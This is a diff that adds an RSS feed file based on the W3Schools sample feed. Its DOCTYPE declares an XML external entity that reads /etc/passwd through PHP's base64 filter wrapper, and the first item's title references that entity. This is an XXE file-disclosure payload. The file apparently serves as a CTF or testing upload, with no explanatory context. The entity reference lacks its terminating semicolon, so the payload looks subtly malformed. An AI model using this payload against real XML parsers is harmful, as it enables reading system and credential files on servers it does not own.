@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<rss version="2.0">
+
+<!DOCTYPE foo [<!ENTITY pass SYSTEM "php://filter/convert.base64-encode/resource=///etc/passwd">]>
+
+<channel>
+  <title>W3Schools Home Page</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>&pass</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
+  </item>
+  <item>
+    <title>XML Tutorial</title>
+    <link>https://www.w3schools.com/xml</link>
+    <description>New XML tutorial on W3Schools</description>
+  </item>
+</channel>
+
+</rss>
